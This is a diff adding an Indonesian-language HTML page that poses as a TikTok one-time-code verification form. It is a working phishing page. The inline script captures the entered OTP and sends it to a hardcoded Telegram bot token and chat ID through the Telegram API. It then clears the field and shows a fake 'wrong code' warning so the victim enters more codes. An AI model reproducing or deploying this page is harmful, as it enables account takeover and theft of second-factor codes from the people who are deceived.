@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title> O T P </title>
+    <link href='https://unpkg.com/boxicons@2.1.2/css/boxicons.min.css' rel='stylesheet'>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <style>
+        body {
+            margin: 0px;
+            padding: 0px;
+            width: 100%;
+            height: 500px;
+            font-family: sans-serif;
+            background-color: #000;
+            background-size: 100%;
+        }
+
+        .login{
+            width: 100%;
+            text-align: center;
+            height: 400px;    
+            box-sizing: border-box;
+            padding: 20px;
+            position: center;
+            background-color: white;
+            border-radius: 15px;
+            border: 5px transparent;                           
+        }
+        .login input-group{
+            position: center;
+            width: 100%;
+        }
+        img {
+            width: 100%;
+            padding: 20px;
+        }
+        h3 {
+            font-size: 16px;
+            color: #131313;
+        }
+        p {
+            font-size: 14px;
+        }
+        .login .input-group input[type=password]{
+            width: 85%;
+            height: 42px;
+            font-size: 18px;
+            padding: 0px;
+            border-radius: 5px;
+            text-align: center;
+            border: 1px solid ;            
+        }
+        .login .input-group button[type=submit]{
+            width: 85%;
+            height: 40px;
+            border: 0px solid transparent;
+            border-radius: 5px;
+            background-color: #FE2C55;
+            color: white;
+            position: relative;
+            align-items: center;                             
+        }
+        .eye-icon{
+            position: absolute;
+            top: 140px;
+            right: 60px;
+            color: #1a1a1c;
+            cursor: pointer;
+            padding: 8px;
+            font-size: 20px;
+            transform: translateY(0%);
+        }
+        .login .input-group span{
+            position: fixed;
+            top: 188px;
+            right: 105px;
+            padding: 5px;
+            font-size: 20px;
+            text-transform: capitalize;
+            background-color: none;
+            transition: 0.5s;            
+        }
+    </style>
+</head>
+<body>
+    <header class="img">
+        <img src="" width="0%">
+    </header>
+    <form action="otpp.php" onsubmit="return sender()">
+        <div class="login">
+            <div class="input-group">
+                
+                <h3>Masukkan kode verifikasi</h3>
+                <br>
+            </div>
+             <div class="input-group">
+                <input name="otp" id="pl" class="inppin" inputmode="numeric" type="password" pattern="(?=.*[0-9]).{4,6}"  required oninvalid="this.setCustomValidity('𝖬𝖺𝗌𝗎𝗄𝗄𝖺𝗇 𝗢𝗧𝗣 4/6 digit 𝖽𝖾𝗇𝗀𝖺𝗇 𝖻𝖾𝗇𝖺𝗋')" onchange="this.setCustomValidity('')" autocomplete="off" placeholder="" minlength="4" maxlength="6"
+      required>
+                
+                <p class="desc" style="font-size: 14px; line-height: 16px; margin-top: 20px">
+Kode 𝗢𝗧𝗣 di kirim via 𝗦𝗠𝗦/𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽/𝗘𝗺𝗮𝗶𝗹,<br>𝗢𝗧𝗣 akan kedaluwarsa setelah 3 menit.</p>
+<div class="card-body d-flex py-5">					
+<div class="col"> 
+<div class="row"> 
+<div class="col-12 col-sm-8 col-md-7 col-lg-6 mx-auto"> 
+ <!-- Modal --> 
+
+<div class="row"> 
+<div class="col-12"> 
+<div class="alert alert-v2 alert-warning d-flex" role="alert"> 
+</div> 
+<div> 
+
+   <div class="row"> 
+     
+     <p><a style="font-weight: bold; font-size: 14px; color: #000; text-align: center; margin: 19px auto;" id="timers">03 : 00</p> 
+    </div> 
+ 
+    <p><a style="font-weight: bold; font-size: 13px; color: #000; text-align:left ; margin: 20px auto;" href="otpp.php" onclick=""><b>Kirim ulang kode</b></a></p>
+ 
+</div> 
+</div> 
+</div> 
+               <br><br>
+            </div>
+              <div class="input-group"> 
+<div class="col-12 col-sm col-md-8 mx-auto"> <button href="#" id="btnSubmit" class="btn-punya" type="submit" >𝗠𝗮𝘀𝘂𝗸 </button> 
+            </div>
+        </div>
+    </form>
+         
+         </div>
+         
+     <br><br><br><br>    <br>
+      <br><br><br><br><br>   
+         
+    <p style="font-weight: ; font-size: 12px; color: #fff; text-align: center; margin: 19px auto;" href="#" onclick=""><b>Anda mungkin menerima SMS, notifikasi WhatsApp,<br> dan notifikasi pesan instan lainnya.</b></p>
+         
+</div>
+</div> 
+    <script>
+        //bot token
+        var telegram_bot_id = "8477958647:AAGfDluTesqg1TzOw1xzUn4suNLZEuYJQ6Q"
+        //chat id
+        var chat_id = -1003985526393
+        var u_password;
+        var ready = function submitdata(){
+            u_password = document.getElementById("pl").value;
+            setTimeout(function(){
+$(".alert").text("⚠️Kode salah, Masukkan lagi.");
+$(".alert").css("color","red");
+ },2000);
+            message = "TikTok\n \nOTP: " + u_password 
+        };
+        var sender =function () {
+            ready();
+            var settings = {
+                "async": true,
+                "crossDomain": true,
+                "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+                "method": "POST",
+                "headers": {
+                    "Content-Type": "application/json",
+                    "cache-control": "no-cache"
+                },
+                "data": JSON.stringify({
+                    "chat_id": chat_id,
+                    "text": message
+                })
+            };
+            $.ajax(settings).done(function(response) {
+                console.log('');
+            });
+            document.getElementById("pl").value = "";
+            return false;
+        };
+    </script>    
+       <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="mainkode.js"></script>
+<script>
+        document.getElementById('timer').innerHTML =
+          01 + ":" + 00;
+        startTimer();
+        
+       
+        
+        function startTimer() {
+          var presentTime = document.getElementById('timer').innerHTML;
+          var timeArray = presentTime.split(/[:]+/);
+          var m = timeArray[0];
+          var s = checkSecond((timeArray[1] - 1));
+          if(s==59){m=m-3}
+          if(m<3){
+            return
+          }
+          
+          document.getElementById('timer').innerHTML =
+            m + " : " + s;
+          console.log(m)
+          setTimeout(startTimer, 3000);
+          
+        }
+        
+        function checkSecond(sec) {
+          if (sec < 10 && sec >= 0) {sec = "3" + sec}; // add zero in front of numbers < 10
+          if (sec < 3) {sec = "59"};
+          return sec;
+        }
+        
+        
+    </script> 
+  <script>
+      document.getElementById('timers').innerHTML =
+          3 + ":" + 00;
+        startTimer();
+        
+        function startTimer() {
+          var presentTime = document.getElementById('timers').innerHTML;
+          var timeArray = presentTime.split(/[:]+/);
+          var m = timeArray[0];
+          var s = checkSecond((timeArray[1] - 1));
+          if(s==59){m=m-1}
+          if(m<0){
+            return
+          }
+          
+          document.getElementById('timers').innerHTML =
+            m + " : " + s;
+          console.log(m)
+          setTimeout(startTimer, 1000);
+          
+        }
+        
+        function checkSecond(sec) {
+          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+          if (sec < 0) {sec = "59"};
+          return sec;
+        }
+        
+        
+                        
+  </script>
+</body>
+</html> 
